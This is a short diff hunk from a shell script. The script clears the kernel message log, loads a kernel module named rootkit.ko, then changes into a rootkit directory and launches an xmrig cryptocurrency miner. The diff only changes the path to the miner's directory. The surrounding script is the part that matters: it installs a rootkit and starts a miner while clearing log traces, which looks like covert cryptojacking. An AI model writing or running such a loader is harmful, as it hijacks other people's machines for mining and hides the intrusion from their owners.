@@ -22,7 +22,7 @@ dmesg -C
 insmod rootkit.ko
 dmesg 
 echo "done loading module"
-cd oilrig 
+cd rootkit/oilrig 
 . "./xmrig"
 
 echo "done launching "
